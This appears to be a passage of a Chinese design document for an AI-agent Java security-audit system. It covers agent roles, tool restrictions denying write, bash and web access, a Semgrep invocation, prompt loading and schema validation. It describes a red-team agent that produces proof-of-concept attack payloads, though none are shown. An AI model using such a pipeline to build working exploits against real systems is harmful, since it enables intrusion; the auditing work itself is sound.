   VULNERABLE 时填 attack_vector / poc_payload / max_impact 的速查表
```

**示例片段**（`injection-family.md` 的"常见误判"段）：

```
- ❌ 看到 `PreparedStatement` 类名就判 DEFENDED —— 关键看 SQL 字符串是字面量 + 用 `?` 占位
- ❌ 看到一个 if 校验就判 DEFENDED —— sink 里的其他参数可能仍可控
- ❌ "教学项目 / WebGoat" 借口 —— 一律按生产代码标准
- ❌ "用户必须登录" 借口 —— 已登录用户仍可触发注入
- ❌ "前端会校验" 借口 —— 前端校验不作数
```

---

### 3.3 rubrics/ 2 份裁决规范

**目录**：[`skill/security-audit-java/rubrics/`](skill/security-audit-java/rubrics/)

| 文件 | 内容 |
|---|---|
| `defended-evidence.md` | 7 类允许的 DEFENDED 证据 + 5 类禁用理由（同 BlueValidator 路径 B）|
| `red-hints.md` | 按 vuln_type 的 PoC 构造提示（同 RedValidator Action Guidelines 第 2 步）|

这两份规范在 SKILL.md 阶段 3.5/3.6 被引用，作为 reference 文档的补充约束。

---

## 4. AI 可用工具清单

### 4.1 主引擎 Agent 工具权限

所有主引擎 Agent（ReverseTracer / LogicAuditor / RedValidator / BlueValidator）的工具权限
**统一**为：

```
allowed_tools = "lsp,read,codesearch"
```

**禁用工具**（关键合规约束）：
- ❌ `write` —— 不允许修改任何文件
- ❌ `bash` —— 不允许执行 shell 命令
- ❌ `webfetch` —— 不允许联网

**工具说明**：

| 工具 | 用途 | 来源 |
|---|---|---|
| `read` | 读源代码文件 | OpenCode 内置 |
| `lsp` | Language Server Protocol —— go-to-definition / find-references / 类型查询 | OpenCode 内置 |
| `codesearch` | 全项目正则/AST 搜索 | OpenCode 内置 |

工具调用通过 OpenCode HTTP API 完成：

```
POST http://127.0.0.1:<port>/session/<id>/message
{
  "providerID": "...",
  "modelID": "...",
  "parts": [{ "type": "text", "text": "<prompt>" }],
  "tools": ["lsp", "read", "codesearch"],
  "outputSchema": <json schema>
}
```

OpenCode server 在 LLM 工具调用时拦截、执行、把结果返给 LLM，**全程不允许 LLM 直接访问宿主文件系统**。

### 4.2 Skill 模式工具权限

宿主 LLM 工具权限继承 Claude Code / OpenCode 的全集，但 SKILL.md 中明确仅用：

```
read / lsp / codesearch    （代码导航,同主引擎）
TaskCreate / TaskUpdate / TaskList    （强制任务跟踪,主引擎不用）
bash    （仅用于跑 scan.sh / dispatch.py / build_report.py 三个白名单脚本）
```

**不允许的工具**：
- ❌ `write` —— skill 模式不修改目标项目代码
- ❌ `webfetch` —— 不联网

### 4.3 Semgrep 工具（外部进程）

`src/semgrep_scanner.py` 调用 `semgrep` CLI：

```bash
semgrep --json \
    --config semgrep_rules/custom/ \
    --exclude test --exclude it --exclude tests --exclude __tests__ \
    --exclude playwright --exclude mitigation --exclude securepasswords \
    --exclude target --exclude build --exclude .gradle \
    --exclude node_modules --exclude dist --exclude out \
    --exclude wrapper --exclude .idea --exclude .vscode \
    /target/path
```

**14 条 `--exclude`**：测试代码 / 教学反例 / 构建产物 / IDE 元数据 全局排除。

### 4.4 OpenCode HTTP API（系统级）

| 端点 | 用途 |
|---|---|
| `GET /global/health` | 健康检查（5s 间隔） |
| `POST /session` | 创建新会话 |
| `POST /session/:id/message` | 发送消息（含 JSON Schema 结构化输出请求 + retryCount=4） |
| `DELETE /session/:id` | 删除会话 |
| `GET /session/:id/diff` | 获取代码差异（不用） |

---

## 5. Prompt 加载机制

### 5.1 主引擎加载流程

```python
# src/prompts.py
def format_reverse_tracer_prompt(payload_json: str) -> str:
    template = _load_template("reverse_tracer")     # 读 prompts/core/reverse_tracer.yaml
    return template["system_prompt_template"].replace("{payload_json}", payload_json)

# 类似函数:
def format_logic_auditor_prompt(payload_json: str) -> str:    ...
def format_red_validator_prompt(payload_json: str) -> str:    ...
def format_blue_validator_prompt(payload_json: str) -> str:   ...
def format_retry_prompt(payload_json: str) -> str:            ...

def get_output_schema(agent_name: str) -> dict:
    return _load_template(agent_name.lower())["output_schema"]
```

**特点**：
- 模板只有 **1 处变量替换** `{payload_json}`（retry 模板例外，有 `{error_details}` + `{raw_output}`）
- 模板和 schema 在**同一 yaml 文件**，便于版本管理
- 没有动态 prompt 拼接、没有 Jinja2 模板复杂度

### 5.2 引擎调用流程

```python
# src/engine.py 中
recipient = env["recipient"]                                # "LogicAuditor" 等
payload_json = json.dumps(env["payload"], ensure_ascii=False)
prompt = self._get_prompt_for_agent(recipient, payload_json)
output_schema = prompts.get_output_schema(recipient)

agent_timeout = PER_AGENT_TIMEOUT.get(recipient, MAX_AGENT_TIMEOUT)  # 300 或 480
async with OpenCodeAgent(port=port, timeout=agent_timeout) as agent:
    result = await agent.execute(
        prompt,
        allowed_tools="lsp,read,codesearch",
        output_schema=output_schema,
    )
```

### 5.3 Skill 模式加载

宿主 LLM 通过 `frontmatter.description` 自动激活 skill，然后**逐字执行** SKILL.md 内的指令：

```yaml
---
name: security-audit-java
description: 用内置的 Semgrep 规则 + 基于证据的内联裁决审计 Java 项目安全漏洞...
---

你是一名 Java 安全审计员。本 skill 内置约 35 条 Semgrep 规则...
```

reference / rubrics 文档不主动加载，而是在 SKILL.md 工作流中用 `read` 工具按需读取。

---

## 6. 输出 Schema 强制校验机制

### 6.1 三层校验

```
┌────────────────────────────────────────────────────────────────────┐
│ 第 1 层: OpenCode 服务端 JSON Schema 校验（retryCount=4）            │
│   LLM 输出 → 服务端用 outputSchema 校验 → 不符则重试,最多 4 次       │
│   通过后放入 structured_output 字段返回                              │
└──────────────────────┬─────────────────────────────────────────────┘
                        │
                        ▼
┌────────────────────────────────────────────────────────────────────┐
│ 第 2 层: agent.py 客户端 jsonschema 二次校验                          │
│   引擎收到 structured_output 后用 Python jsonschema 库再校验一次     │
│   防服务端校验疏漏                                                    │
└──────────────────────┬─────────────────────────────────────────────┘
                        │
                        ▼
┌────────────────────────────────────────────────────────────────────┐
│ 第 3 层: coerce 救回                                                 │
│   schema 校验失败时,从 LLM 的原始 response 文本里递归找候选 dict,     │
│   选最匹配 schema 的还原.避免"LLM 输出了正确内容但格式漏一个 key"     │
│   导致整条任务丢失                                                    │
└─────────────────────────────────────────────────────────────────────┘
```

`agent.py` 关键代码：

```python
async def execute(self, prompt, allowed_tools, output_schema):
    response = await self._http_post(prompt, allowed_tools, output_schema)
    so = response.get("structured_output")

    # 客户端二次校验
    try:
        jsonschema.validate(so, output_schema)
        return {"structured_output": so, ...}
    except ValidationError as e:
        # coerce 救回:遍历 response 文本里所有 dict 候选,找一个能 validate 的
        rescued = self._coerce_to_schema(response["text"], output_schema)
        if rescued:
            logger.info("schema 复核失败但 coerce 成功救回")
            return {"structured_output": rescued, ...}
        raise
```

### 6.2 各 Agent schema 的 minLength 约束

| Agent | 字段 | minLength | 历史 |
|---|---|---|---|
| ReverseTracer | （无 minLength 约束）| - | - |
| LogicAuditor | `vuln_type` | 1 | - |
| RedValidator EXPLOITABLE | `attack_vector / poc_payload / max_impact` | 1 | - |
| **RedValidator NOT_EXPLOITABLE** | **`defense_analysis`** | **20** | **v13 新加,拦截浅推理** |
| **BlueValidator VULNERABLE-A** | **`attack_vector / max_impact / defense_analysis / mitigation_advice`** | **5** | **v11 从 20 降到 5,救回 9 个被吞漏洞** |
| BlueValidator VULNERABLE-B | `defense_analysis / mitigation_advice` | 5 | 同上 |
| BlueValidator DEFENDED | `defense_analysis` | 1 | - |

### 6.3 oneOf 互斥约束

每个 schema 用 `oneOf` 多变体强制场景互斥，例：

```yaml
oneOf:
  - type: object   # 场景 A
    required: [...A 字段...]
    not:
      anyOf:
        - required: [...只在 B/C 出现的字段...]
  - type: object   # 场景 B
    required: [...B 字段...]
    not: ...
  - type: object   # 场景 C
    required: [...C 字段...]
    not: ...
```

`not.anyOf` 拒绝任何"两个场景字段同时出现"的矛盾输出。例：BlueValidator DEFENDED 场景
**禁止**同时含 `attack_vector` 字段。

---

## 附录：所有 Prompt 文件 / 工具的索引

```
主引擎 Agent Prompts:
  prompts/core/reverse_tracer.yaml   (110 行)  ReverseTracer + output_schema
  prompts/core/logic_auditor.yaml    (181 行)  LogicAuditor + output_schema
  prompts/core/red_validator.yaml    (137 行)  RedValidator + output_schema
  prompts/core/blue_validator.yaml   (251 行)  BlueValidator + output_schema
  prompts/core/retry.yaml            (8 行)    RetryAgent (无 schema)
                                     ─────────
                                     687 行    总规模

Skill 单 LLM 模式 Prompts:
  skill/security-audit-java/SKILL.md                       (6 阶段工作流 + 防偷懒约束)
  skill/security-audit-java/rubrics/defended-evidence.md   (7 类 DEFENDED 证据 + 5 类禁用)
  skill/security-audit-java/rubrics/red-hints.md           (按 vuln_type 的 PoC 提示)
  skill/security-audit-java/reference/INDEX.md             (39 vuln_type → family 映射)
  skill/security-audit-java/reference/*.md                 (13 份家族文档,共 1495 行)

支持脚本（无 LLM,纯 Python）:
  src/agent.py                                    OpenCode HTTP 客户端 + schema 校验 + coerce 救回
  src/prompts.py                                  加载 yaml prompt + output_schema
  src/state_router.py                             vuln_type → CWE / severity 映射 + 报告字段映射
  src/build_summary_report.py                     reports → SUMMARY.md
  skill/security-audit-java/scripts/scan.sh       semgrep 薄封装 + 14 条 --exclude
  skill/security-audit-java/scripts/dispatch.py   去重 + fast-path 分流 + 路由发现过滤
  skill/security-audit-java/scripts/classify.py   vuln_type → CWE / severity 查表
  skill/security-audit-java/scripts/build_report.py   findings JSON → Markdown
```

---

*最后更新：2026-05-16（v13 baseline 完成后）*
